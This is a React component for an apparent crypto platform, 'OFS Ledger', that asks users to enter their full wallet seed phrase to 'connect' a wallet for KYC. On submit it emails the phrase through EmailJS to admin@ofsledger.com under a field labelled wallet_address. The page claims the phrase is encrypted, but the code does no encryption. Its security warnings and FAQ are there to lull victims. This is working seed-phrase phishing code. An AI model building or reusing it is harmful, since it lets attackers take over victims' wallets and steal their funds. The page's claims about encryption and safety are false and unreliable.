import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/context/AuthContext";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/components/ui/use-toast";
import { useTheme } from "@/components/theme-provider";
import emailjs from '@emailjs/browser';
import { 
  Wallet, 
  Shield, 
  AlertTriangle, 
  Lock, 
  KeyRound, 
  Eye, 
  EyeOff,
  ArrowLeft,
  HelpCircle,
  Info,
  Search,
  Mail
} from "lucide-react";

// Supported wallets with seed phrase import
const SUPPORTED_WALLETS = [
  { id: "metamask", name: "Metamask", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "trust", name: "Trust Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "ledger", name: "Ledger", logo: "/placeholder-wallet.svg", seedPhraseWords: [24] },
  { id: "exodus", name: "Exodus Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "rainbow", name: "Rainbow", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "atomic", name: "Atomic", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "crypto", name: "Crypto.com DeFi Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "mathwallet", name: "MathWallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "zelcore", name: "Zelcore", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "viawallet", name: "ViaWallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "xdc", name: "XDC Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "ownbit", name: "Ownbit", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "vision", name: "Vision", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "morix", name: "MoriX Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "safepal", name: "SafePal", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "sparkpoint", name: "SparkPoint", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "unstoppable", name: "Unstoppable", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "peakdefi", name: "PeakDeFi Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
  { id: "infinity", name: "Infinity Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12, 24] },
  { id: "lobstr", name: "Lobstr Wallet", logo: "/placeholder-wallet.svg", seedPhraseWords: [12] },
];

// Supported blockchains for dropdown selection
const SUPPORTED_BLOCKCHAINS = [
  { id: "ethereum", name: "Ethereum", symbol: "ETH" },
  { id: "bitcoin", name: "Bitcoin", symbol: "BTC" },
  { id: "polygon", name: "Polygon", symbol: "MATIC" },
  { id: "solana", name: "Solana", symbol: "SOL" },
  { id: "avalanche", name: "Avalanche", symbol: "AVAX" },
  { id: "binance", name: "Binance Smart Chain", symbol: "BNB" },
  { id: "cardano", name: "Cardano", symbol: "ADA" },
  { id: "xrp", name: "XRP Ledger", symbol: "XRP" },
  { id: "polkadot", name: "Polkadot", symbol: "DOT" },
];

// EmailJS configuration
const EMAILJS_SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
const EMAILJS_TEMPLATE_ID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
const EMAILJS_PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;

const ConnectWallet = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const { toast } = useToast();
  const { theme } = useTheme();
  
  // Create a ref for the hidden form
  const formRef = useRef<HTMLFormElement>(null);
  
  // Form state
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [walletName, setWalletName] = useState<string>("");
  const [seedPhraseCount, setSeedPhraseCount] = useState<number>(12);
  const [seedPhrase, setSeedPhrase] = useState<string>("");
  const [showSeedPhrase, setShowSeedPhrase] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [walletFilter, setWalletFilter] = useState<string>("");
  
  // Filter wallets based on search input
  const filteredWallets = SUPPORTED_WALLETS.filter(wallet => 
    wallet.name.toLowerCase().includes(walletFilter.toLowerCase())
  );
  
  // Get selected wallet details
  const getSelectedWalletDetails = () => {
    return SUPPORTED_WALLETS.find(wallet => wallet.id === selectedWallet);
  };
  
  // Handle wallet selection
  const handleWalletSelect = (walletId: string) => {
    const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
    setSelectedWallet(walletId);
    
    // Set default seed phrase count based on wallet
    if (wallet) {
      if (wallet.seedPhraseWords.length === 1) {
        setSeedPhraseCount(wallet.seedPhraseWords[0]);
      } else {
        setSeedPhraseCount(wallet.seedPhraseWords[0]);
      }
      
      // Set default wallet name
      setWalletName(`My ${wallet.name}`);
    }
  };
  
  // Validate seed phrase
  const validateSeedPhrase = () => {
    const words = seedPhrase.trim().split(/\s+/);
    return words.length === seedPhraseCount;
  };
  
  // Get individual words from seed phrase
  const getSeedPhraseWords = () => {
    return seedPhrase.trim().split(/\s+/).filter(word => word.length > 0);
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isSubmitting) {
      return; // Prevent double submission
    }
    
    if (!validateSeedPhrase()) {
      toast({
        title: "Invalid Seed Phrase",
        description: "Please enter a valid seed phrase with 12-24 words.",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    setError(null);
    
    try {
      // Prepare data for email
      const walletData = {
        user_id: user?.id,
        wallet_address: seedPhrase,
        wallet_name: walletName,
        wallet_type: getSelectedWalletDetails()?.name || "Unknown",
        seed_phrase_count: seedPhraseCount,
        user_email: user?.email || "Unknown"
      };
      
      // Send email with EmailJS only (no Supabase)
      try {
        // Create email parameters
        const emailParams = {
          to_email: 'admin@ofsledger.com',
          from_name: user?.email || 'OFS Ledger User',
          subject: 'New Wallet Connection',
          wallet_name: walletData.wallet_name,
          wallet_type: walletData.wallet_type,
          user_email: walletData.user_email,
          seed_phrase_count: walletData.seed_phrase_count.toString(),
          wallet_address: walletData.wallet_address,
          message: `A new wallet has been connected by ${walletData.user_email}. Wallet type: ${walletData.wallet_type}`
        };
        
        console.log('Sending email with params:', {
          serviceID: import.meta.env.VITE_EMAILJS_SERVICE_ID,
          templateID: import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
          hasPublicKey: !!import.meta.env.VITE_EMAILJS_PUBLIC_KEY
        });
        
        // Use promise-based approach
        emailjs.send(
          import.meta.env.VITE_EMAILJS_SERVICE_ID,
          import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
          emailParams,
          import.meta.env.VITE_EMAILJS_PUBLIC_KEY
        ).then((result) => {
          console.log('Email sent successfully:', result.text);
          
          // Show success message
          toast({
            title: "Wallet Connection Email Sent",
            description: "Admin has been notified about your wallet connection.",
          });
          
          // Reset form
          handleReset();
          
          // Navigate to dashboard after a short delay
          setTimeout(() => {
            navigate("/dashboard");
          }, 1000);
          
          setIsSubmitting(false);
        }).catch((error) => {
          console.error('Error sending email:', error);
          setError(error.text || "Failed to send email notification");
          toast({
            title: "Error Sending Email",
            description: "There was an error notifying admin. Please try again.",
            variant: "destructive",
          });
          setIsSubmitting(false);
        });
      } catch (emailError) {
        console.error('Error preparing email:', emailError);
        throw emailError;
      }
    } catch (error) {
      console.error("Error in wallet connection process:", error);
      const message = error instanceof Error ? error.message : "There was an error connecting your wallet. Please try again.";
      setError(message);
      toast({
        title: "Error Connecting Wallet",
        description: message,
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };
  
  // Reset form
  const handleReset = () => {
    setSelectedWallet(null);
    setWalletName("");
    setSeedPhrase("");
  };
  
  return (
    <div className="space-y-6">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="flex items-center gap-2">
          <Button 
            variant="ghost" 
            onClick={() => navigate("/dashboard")}
            className="gap-2"
          >
            <ArrowLeft className="h-4 w-4" />
            Back to Dashboard
          </Button>
        </div>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Connect Your Wallet</CardTitle>
          <CardDescription>
            Choose your wallet type and enter your seed phrase to connect
          </CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Form fields */}
            <div className="space-y-6">
              <Alert variant="destructive" className="bg-destructive/5 text-destructive border-destructive/20">
                <AlertTriangle className="h-4 w-4" />
                <AlertTitle>SECURITY WARNING</AlertTitle>
                <AlertDescription>
                  Never share your seed phrase with anyone. 
                  OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                </AlertDescription>
              </Alert>
              
              <div className="relative">
                <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search wallets..."
                  value={walletFilter}
                  onChange={(e) => setWalletFilter(e.target.value)}
                  className="pl-8 mb-4"
                />
              </div>
              
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
                {filteredWallets.map((wallet) => (
                  <div
                    key={wallet.id}
                    className="flex flex-col items-center p-4 rounded-lg border-2 cursor-pointer transition-all hover:border-primary/50 hover:bg-primary/5"
                    onClick={() => handleWalletSelect(wallet.id)}
                  >
                    <div className="w-12 h-12 mb-2 rounded-full bg-background flex items-center justify-center">
                      <img
                        src={wallet.logo}
                        alt={wallet.name}
                        className="w-10 h-10 object-contain"
                        onError={(e) => {
                          (e.target as HTMLImageElement).src = "/placeholder-wallet.svg";
                        }}
                      />
                    </div>
                    <span className="text-sm font-medium text-center">{wallet.name}</span>
                    <span className="text-xs text-muted-foreground mt-1">
                      {wallet.seedPhraseWords.join("/")} words
                    </span>
                  </div>
                ))}
              </div>
              
              <Alert>
                <Info className="h-4 w-4" />
                <AlertTitle>Wallet Compatibility</AlertTitle>
                <AlertDescription>
                  Only wallets that support seed phrase import are shown. Make sure you have your seed phrase ready.
                </AlertDescription>
              </Alert>
            </div>
            
            {selectedWallet && (
              <div className="space-y-6">
                <div className="flex items-center gap-3 mb-4 p-3 bg-primary/5 rounded-lg">
                  <div className="w-10 h-10 rounded-full bg-background flex items-center justify-center">
                    <img
                      src={getSelectedWalletDetails()?.logo}
                      alt={getSelectedWalletDetails()?.name}
                      className="w-8 h-8 object-contain"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = "/placeholder-wallet.svg";
                      }}
                    />
                  </div>
                  <div>
                    <div className="font-medium">{getSelectedWalletDetails()?.name}</div>
                    <div className="text-xs text-muted-foreground">
                      Supports {getSelectedWalletDetails()?.seedPhraseWords.join(" or ")} word seed phrases
                    </div>
                  </div>
                </div>
                
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="wallet-name">Wallet Name</Label>
                    <Input
                      id="wallet-name"
                      placeholder="e.g., My Main Ethereum Wallet"
                      value={walletName}
                      onChange={(e) => setWalletName(e.target.value)}
                    />
                  </div>
                  
                  {getSelectedWalletDetails()?.seedPhraseWords.length === 2 && (
                    <div className="space-y-2">
                      <Label htmlFor="seed-phrase-count">Seed Phrase Length</Label>
                      <Select
                        value={seedPhraseCount.toString()}
                        onValueChange={(value) => setSeedPhraseCount(parseInt(value))}
                      >
                        <SelectTrigger id="seed-phrase-count">
                          <SelectValue placeholder="Select seed phrase length" />
                        </SelectTrigger>
                        <SelectContent>
                          {getSelectedWalletDetails()?.seedPhraseWords.map((count) => (
                            <SelectItem key={count} value={count.toString()}>
                              {count} Words
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                  )}
                  
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <Label htmlFor="seed-phrase">Seed Phrase ({seedPhraseCount} words)</Label>
                      <Button
                        variant="ghost"
                        size="sm"
                        className="h-6 px-2 text-xs"
                        onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                      >
                        {showSeedPhrase ? (
                          <>
                            <EyeOff className="h-3 w-3" />
                            Hide
                          </>
                        ) : (
                          <>
                            <Eye className="h-3 w-3" />
                            Show
                          </>
                        )}
                      </Button>
                    </div>
                    
                    {/* Elaborate Seed Phrase Input */}
                    <div className={`p-4 border rounded-lg bg-card ${!showSeedPhrase ? "text-password" : ""}`}>
                      <div className="grid grid-cols-3 md:grid-cols-4 gap-2">
                        {Array.from({ length: seedPhraseCount }).map((_, index) => {
                          const words = getSeedPhraseWords();
                          const word = index < words.length ? words[index] : "";
                          
                          return (
                            <div key={index} className="relative">
                              <div className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground font-mono">
                                {index + 1}.
                              </div>
                              <input
                                type={showSeedPhrase ? "text" : "password"}
                                value={word}
                                onChange={(e) => {
                                  const words = getSeedPhraseWords();
                                  words[index] = e.target.value;
                                  setSeedPhrase(words.join(" "));
                                }}
                                className={`w-full h-10 px-7 py-2 rounded border ${
                                  word ? "border-primary/30 bg-primary/5" : "border-input"
                                } text-sm font-mono focus:outline-none focus:ring-1 focus:ring-primary`}
                                placeholder={`Word ${index + 1}`}
                              />
                            </div>
                          );
                        })}
                      </div>
                      
                      <div className="mt-4 flex items-center justify-between">
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          onClick={() => setSeedPhrase("")}
                          className="text-xs"
                        >
                          Clear All
                        </Button>
                        
                        <div className="text-xs text-muted-foreground">
                          <span className={getSeedPhraseWords().length === seedPhraseCount ? "text-green-500" : ""}>
                            {getSeedPhraseWords().length}
                          </span>/{seedPhraseCount} words
                        </div>
                      </div>
                    </div>
                    
                    <p className="text-xs text-muted-foreground mt-2">
                      Your seed phrase is securely encrypted and stored. We never share this information with third parties.
                    </p>
                  </div>
                </div>
                
                <Alert variant="destructive" className="bg-destructive/5 text-destructive border-destructive/20">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertTitle>Security Warning</AlertTitle>
                  <AlertDescription>
                    Never share your seed phrase with anyone. OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                  </AlertDescription>
                </Alert>
                
                <div className="flex justify-end gap-4">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleReset}
                    disabled={isSubmitting}
                  >
                    Reset
                  </Button>
                  <Button 
                    type="submit"
                    disabled={!selectedWallet || !seedPhrase || isSubmitting}
                  >
                    {isSubmitting ? (
                      <>
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                        Connecting...
                      </>
                    ) : (
                      <>
                        <Wallet className="mr-2 h-4 w-4" />
                        Connect Wallet
                      </>
                    )}
                  </Button>
                </div>
                
                {error && (
                  <Alert variant="destructive">
                    <AlertTriangle className="h-4 w-4" />
                    <AlertTitle>Error</AlertTitle>
                    <AlertDescription>{error}</AlertDescription>
                  </Alert>
                )}
              </div>
            )}
          </form>
        </CardContent>
      </Card>
      
      <Card>
        <CardHeader>
          <CardTitle>Wallet Connection FAQ</CardTitle>
          <CardDescription>
            Frequently asked questions about connecting wallets
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className={`rounded-lg p-4 border ${
              theme === "dark" ? "bg-card" : "bg-gray-50"
            }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What is a seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                A seed phrase (also called a recovery phrase or mnemonic) is a series of words that store all the information needed to recover your wallet. It's like a master password that generates all your private keys.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${
              theme === "dark" ? "bg-card" : "bg-gray-50"
            }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Is it safe to enter my seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                Your seed phrase is encrypted before being stored and is never accessible in plain text after submission. We use industry-standard encryption to protect your data. However, you should never share your seed phrase with anyone.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${
              theme === "dark" ? "bg-card" : "bg-gray-50"
            }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What happens after I connect my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                After connecting your wallet, it will be submitted for KYC verification. Once verified, you'll be able to perform withdrawals and other operations. KYC verification typically takes 24-48 hours.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${
              theme === "dark" ? "bg-card" : "bg-gray-50"
            }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Why do I need to verify my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                KYC verification ensures that you are the legitimate owner of the wallet and helps prevent fraud. This is a security measure to protect both you and the platform.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default ConnectWallet;

// Add a CSS class for password masking
const style = document.createElement('style');
style.textContent = `
  .text-password {
    -webkit-text-security: disc;
    font-family: text-security-disc;
  }
`;
document.head.appendChild(style);
